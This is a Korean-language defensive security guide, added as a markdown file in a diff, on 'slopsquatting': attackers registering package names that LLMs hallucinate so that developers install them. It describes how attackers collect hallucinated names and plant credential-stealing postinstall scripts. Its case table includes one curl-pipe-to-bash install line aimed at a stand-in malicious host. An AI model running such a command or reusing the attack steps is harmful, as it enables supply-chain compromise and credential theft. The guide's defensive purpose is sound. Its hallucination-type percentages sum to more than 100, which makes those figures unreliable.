@@ -1,0 +1,179 @@
+---
+title: AI 환각 기반 공급망 공격 – Slopsquatting 가이드
+author: SEPilot AI
+status: published
+tags: [AI 환각, 공급망 보안, Slopsquatting, 패키지 레지스트리, LLM 보안]
+---
+
+## 1. 서론
+### 문서 목적 및 대상 독자
+본 가이드는 **소프트웨어 개발자**, **보안 엔지니어**, **DevOps 팀**, 그리고 **조직의 보안 정책 담당자**를 대상으로 합니다. AI 기반 코드 생성 도구를 일상적으로 활용하는 환경에서, LLM(대형 언어 모델)의 환각이 새로운 공급망 위협인 *Slopsquatting* 으로 전이되는 메커니즘을 이해하고, 실효성 있는 방어·완화 전략을 제공하는 것이 목적입니다.
+
+### AI 환각과 공급망 공격의 최신 트렌드
+생성형 AI가 코드를 자동으로 제안할 때, **환각(hallucination)** 현상이 빈번히 발생합니다. 최근 USENIX Security 2025 연구에 따르면, 576 000개의 코드 샘플 중 **약 20 %**가 존재하지 않는 패키지를 권장했습니다[[euno.news](https://euno.news/posts/ko/slopsquatting-ai-hallucinations-as-supply-chain-at-801d9c)]. 이러한 가짜 패키지는 공격자가 미리 레지스트리에 등록해 두고, AI가 제안하는 대로 개발자가 설치하도록 유도함으로써 공급망을 오염시킵니다.
+
+### “Slopsquatting” 용어 정의와 등장 배경
+- **타이포스쿼팅(typosquatting)**: 인간이 흔히 저지르는 철자 오류를 이용해 비슷한 이름의 악성 패키지를 등록하는 전통적 기법.  
+- **Slopsquatting**: *AI 환각*을 베팅한다는 의미로, LLM이 생성한 **전혀 존재하지 않는** 패키지 이름을 공격자가 선점하는 새로운 공격 패턴. 이 용어는 파이썬 소프트웨어 재단의 보안 개발자‑인‑레지던스인 **Seth Larson**이 정의했습니다[[euno.news](https://euno.news/posts/ko/slopsquatting-ai-hallucinations-as-supply-chain-at-801d9c)].
+
+---
+
+## 2. Slopsquatting 개념 및 메커니즘
+### 타이포스쿼팅 vs. Slopsquatting 비교
+| 항목 | 타이포스쿼팅 | Slopsquatting |
+|------|--------------|----------------|
+| 목표 | 인간의 오타 유도 | LLM 환각 유도 |
+| 이름 패턴 | 기존 인기 패키지와 1~2글자 차이 (ex. `crossenv`) | 완전 신규 문자열, 실제 존재하지 않음 (ex. `huggingface-cli`) |
+| 방어 난이도 | 레지스트리 필터링·유사도 차단으로 어느 정도 차단 가능 | 기존 필터가 전혀 탐지하지 못함 (실제 패키지가 없기 때문) |
+
+### LLM 환각이 생성하는 가짜 패키지 이름
+USENIX 연구에 따르면 환각은 세 가지 유형으로 구분됩니다[[euno.news](https://euno.news/posts/ko/slopsquatting-ai-hallucinations-as-supply-chain-at-801d9c)]:
+1. **순수 허구 (51 %)** – 완전 무관한 문자열.
+2. **실제 패키지 혼합 (38 %)** – 기존 패키지와 조합된 형태 (ex. `express-mongoose`).
+3. **오타 변형 (13 %)** – 정식 이름의 철자 오류.
+
+### 공격자가 이름을 수집·등록하는 단계별 흐름
+1. **LLM 질의 반복** – 동일 질문을 10회 이상 수행해 일관된 환각 이름을 추출. 연구에 따르면 **43 %**의 환각 이름이 매번 동일하게 나타났으며, **58 %**는 두 번 이상 재현되었습니다[[euno.news](https://euno.news/posts/ko/slopsquatting-ai-hallucinations-as-supply-chain-at-801d9c)].
+2. **이름 정제** – 순수 허구와 혼합형 중 공격에 활용하기 적합한 이름을 선택.
+3. **레지스트리 등록** – npm, PyPI 등 주요 패키지 레지스트리에 동일 이름을 동시에 등록(교차 생태계 8.7 % 중복)[[euno.news](https://euno.news/posts/ko/slopsquatting-ai-hallucinations-as-supply-chain-at-801d9c)].
+4. **악성 페이로드 삽입** – `postinstall` 스크립트, URL‑기반 의존성 등으로 API 키, 클라우드 토큰, SSH 키 등을 탈취하도록 설계.
+5. **전파** – AI 코드 생성 도구가 해당 이름을 권장하면, 개발자는 무의식적으로 악성 패키지를 설치하게 됨.
+
+---
+
+## 3. 연구·실증 증거
+### USENIX Security 2025 연구 개요
+- **대상**: 16개 언어 모델, 총 576 000개의 코드 샘플.  
+- **핵심 결과**: 약 **20 %**의 샘플이 최소 하나의 존재하지 않는 패키지를 권장[[euno.news](https://euno.news/posts/ko/slopsquatting-ai-hallucinations-as-supply-chain-at-801d9c)].
+
+### 환각 유형 비율
+- 순수 허구: **51 %**  
+- 실제 패키지 혼합: **38 %**  
+- 오타 변형: **13 %**
+
+### 반복 질의 실험 결과 (일관성·재현성)
+- **43 %**의 환각된 이름이 10회 반복 질의 모두에서 동일하게 나타남.  
+- **58 %**는 두 번 이상 재현됨.
+
+### 교차 생태계 연관성 통계
+- 환상적인 파이썬 패키지 이름 중 **8.7 %**가 실제 자바스크립트 패키지와 동일한 문자열을 가짐[[euno.news](https://euno.news/posts/ko/slopsquatting-ai-hallucinations-as-supply-chain-at-801d9c)].
+- 이는 공격자가 **npm**과 **PyPI** 양쪽에 동시에 가짜 패키지를 등록해 두 생태계 트래픽을 동시에 가로챌 수 있음을 의미합니다.
+
+---
+
+## 4. 실제 사례 분석
+| 패키지 | 레지스트리 | 내용 | 현재 상황 |
+|-------|-----------|------|-----------|
+| `huggingface-cli` | PyPI | 빈 자리표시자 패키지(악성 코드 없음)로 등록 후 3개월 만에 30 000+ 다운로드 기록. AI 도구가 `pip install huggingface-cli`를 권장하면서 무의식적 설치 발생. | 아직 악성 페이로드는 없지만, 동일 메커니즘으로 악성 변형 가능. |
+| `unused-imports` | npm | 악성 `postinstall` 스크립트가 포함돼 API 키 탈취. 현재 주당 약 **233** 다운로드(2026년 초) 지속. | 공식 `eslint-plugin-unused-imports`와 혼동 가능. |
+| `react-codeshift` | npm | `jscodeshift`와 `react-codemod`를 결합한 이름. LLM이 생성한 에이전트‑스킬 파일에 자동 커밋된 형태로 등장, 인간 개입 없이 전파. | `package.json`은 정상적으로 보이지만 `postinstall`에서 원격 URL을 호출해 악성 코드 다운로드. |
+| 기타 변종 | npm / PyPI | URL‑기반 의존성(`"install": "curl https://malicious.example.com | bash"`)을 이용해 설치 시 외부 스크립트 실행. | 최신 변종으로, 레지스트리 메타데이터는 정상적이지만 실행 시점에 악성 로드. |
+
+**페이로드 유형**: API 키, 클라우드 토큰, SSH 키 탈취, 원격 쉘 실행, 랜섬웨어 다운로드 등.  
+
+---
+
+## 5. 기존 방어 메커니즘의 한계
+1. **전통적 타이포스쿼팅 방어**  
+   - 레지스트리 차단·유사도 필터링은 *이미 존재하는* 인기 패키지와의 유사성을 탐지하지만, **전혀 존재하지 않는** 문자열은 탐지 대상이 아님.
+2. **레지스트리 수준 방어**  
+   - 신규 패키지에 대한 “인기 이름과 너무 유사” 경고는 환상적인 이름에 적용되지 않음.  
+   - 실제 패키지가 없으므로 메타데이터(다운로드 수, 유지보수 기록 등)도 없으며, 필터링 로직이 작동하지 않음.
+3. **자동 의존성 해결 도구**  
+   - `npm ci`, `pip install` 등은 **패키지 이름만** 검증하고, 레지스트리에서 제공하는 메타데이터를 신뢰함.  
+   - LLM이 제안한 가짜 이름이 레지스트리에 존재한다면, 도구는 별다른 경고 없이 설치를 진행함.
+
+---
+
+## 6. 효과적인 방어·완화 전략
+### 1. 의존성 고정 및 lockfile 활용
+- **npm**: `npm ci` (package‑lock.json 기반, lockfile이 없으면 실패)  
+- **pnpm**: `pnpm install --frozen-lockfile`  
+- **Poetry**: `poetry lock` 및 `poetry install`  
+Lockfile은 정확한 버전과 체크섬을 고정하므로, 이후에 동일 이름의 악성 패키지가 등록돼도 기존 설치에 영향을 주지 않음.
+
+### 2. 패키지 설치 전 검증 절차
+- **메타데이터 확인**  
+  - npm: `npm view <package> --json` → 발행자, 생성일, 주간 다운로드 수 확인.  
+  - PyPI: https://pypi.org/project/<package>/ → 최근 생성 날짜, README 존재 여부, GitHub 링크 검증.  
+- **체크리스트**  
+  1. 발행자 계정이 신뢰할 수 있는가?  
+  2. 패키지 버전이 2개 이상 존재하는가?  
+  3. 다운로드 트렌드가 급격히 상승했는가?  
+  4. 공식 레포지토리(예: GitHub)와 연결돼 있는가?  
+
+### 3. 레지스트리 모니터링 및 알림
+- **신규 패키지 자동 스캔**: `OSS Index`, `Snyk`, `GitHub Dependabot` 등과 연동해 신규 패키지에 위험도 점수 부여.  
+- **교차 생태계 동일 이름 감시**: 동일 문자열이 npm과 PyPI 양쪽에 동시에 등록될 경우 알림 트리거.  
+
+### 4. AI 코드 생성 도구 설정 강화
+- **프롬프트 정책**: “공식 레지스트리( npm, PyPI)만 사용하고, 존재 여부를 확인하라” 라는 지시문을 기본 프롬프트에 포함.  
+- **출력 검증 플러그인**: LLM 출력 후 자동으로 `npm view`/`pypi.org` 조회를 수행하고, 메타데이터가 부족하면 경고를 반환하도록 파이프라인 구축.  
+
+### 5. 사전 차단 정책
+- **블랙리스트 운영**: 조직 내부에서 확인된 가짜 패키지 이름을 블랙리스트에 추가하고, CI/CD 파이프라인에서 설치를 차단.  
+- **프록시 레지스트리**: 사내 Nexus, Artifactory 등 프록시 레지스트리를 통해 **허용 목록(allow‑list)** 기반으로만 패키지를 제공.  
+
+---
+
+## 7. 탐지·사고 대응 절차
+### 실시간 로그·패키지 설치 이벤트 수집
+- **npm**: `npm audit` 로그, `npm install` 시 `npm-debug.log` 수집.  
+- **pip**: `pip install -v` 출력 및 `pip.log` 수집.  
+- **CI/CD**: GitHub Actions, GitLab CI 등에서 `install` 단계 로그를 중앙 로그 서버(ELK, Splunk)로 전송.
+
+### 이상 징후 탐지 규칙
+- **급증하는 다운로드**: 동일 패키지에 대한 일일 다운로드가 100% 이상 급증.  
+- **비정상적인 postinstall 스크립트**: `postinstall`에 외부 URL 호출, 쉘 명령 포함 여부.  
+- **새로운 패키지 이름이 lockfile에 자동 추가**: lockfile이 자동으로 업데이트되는 경우 경고.
+
+### 침해 사고 시 초기 대응
+1. **패키지 회수**: 레지스트리 관리자에게 해당 패키지 삭제 요청.  
+2. **Lockfile 재생성**: 기존 lockfile을 삭제하고, 검증된 패키지만으로 새로 생성.  
+3. **비밀키 회전**: 노출 가능성이 있는 API 키, 토큰, SSH 키 등을 즉시 교체.  
+4. **포렌식**: 설치 로그, npm/pip 캐시, 시스템 파일 변경 내역을 보존하고, 악성 스크립트 분석을 위해 샌드박스에 복제.
+
+### 증거 보존 권고사항
+- 설치 전후 `npm view`/`pip show` 출력 저장.  
+- CI/CD 파이프라인의 전체 실행 로그 보관 (7일 이상).  
+- 시스템 파일 해시(SHA256)와 변경 시점 기록.
+
+---
+
+## 8. 권고사항 및 베스트 프랙티스 체크리스트
+- **개발 단계**  
+  - [ ] AI 코드 생성 프롬프트에 “공식 레지스트리만 사용” 명시.  
+  - [ ] LLM 출력 후 자동 메타데이터 검증 파이프라인 적용.  
+- **CI/CD**  
+  - [ ] `npm ci` / `pnpm install --frozen-lockfile` 사용.  
+  - [ ] 의존성 설치 전 레지스트리 모니터링 플러그인 활성화.  
+- **조직 정책**  
+  - [ ] 사내 레지스트리 프록시를 통한 허용 목록 운영.  
+  - [ ] 신규 패키지 블랙리스트 관리 및 정기 리뷰.  
+- **교육·인식**  
+  - [ ] 개발자 대상 “AI 환각·Slopsquatting” 워크숍 정기 개최.  
+  - [ ] 보안 팀과 AI 도구 공급업체 간 정보 공유 채널 구축.  
+- **위협 인텔리전스**  
+  - [ ] ENISA 2025, USENIX 2025 등 최신 연구 결과를 정기 구독.  
+  - [ ] Socket.dev, DevOps.com 등에서 발표되는 Slopsquatting 관련 알림 구독.
+
+---
+
+## 9. 부록
+### 용어 정의
+- **환각(Hallucination)**: LLM이 실제 존재하지 않거나 근거 없는 정보를 생성하는 현상.  
+- **Slopsquatting**: AI 환각을 이용해 가짜 패키지 이름을 레지스트리에 등록하고, 개발자를 속여 설치하게 하는 공급망 공격.  
+- **타이포스쿼팅(Typosquatting)**: 인간의 오타를 이용한 악성 패키지 등록 기법.  
+
+### 주요 연구·보고서 요약 링크
+- USENIX Security 2025 논문 (576 000 코드 샘플) – [euno.news 요약](https://euno.news/posts/ko/slopsquatting-ai-hallucinations-as-supply-chain-at-801d9c)  
+- DevOps.com 기사 “Best of 2025: AI‑Generated Code Packages Can Lead to ‘Slopsquatting’ Threat” – <https://devops.com/ai-generated-code-packages-can-lead-to-slopsquatting-threat-2/>  
+- Socket.dev 블로그 “ENISA’s 2025 Threat Landscape: AI Reshapes Cyber Attacks” – <https://socket.dev/blog/enisa-s-2025-threat-landscape-ai-reshapes-cyber-attacks>  
+
+### 참고 URL 및 추가 자료
+- 보안뉴스 – AI 코드 환각 관련 기사: <http://www.boannews.com/media/view.asp?idx=136863>  
+- SSLC – AI 환각과 Slopsquatting 요약: <https://sslc.kr/board/news/1002>  
+- Wins21 – Slopsquatting 용어 정의: <https://www.wins21.com/kor/promotion/information.html?bmain=view&language=KOR&uid=5385>  
+- Daum 뉴스 – AI 코드 환각 경고: <https://v.daum.net/v/20251209144849884>  
+
+---
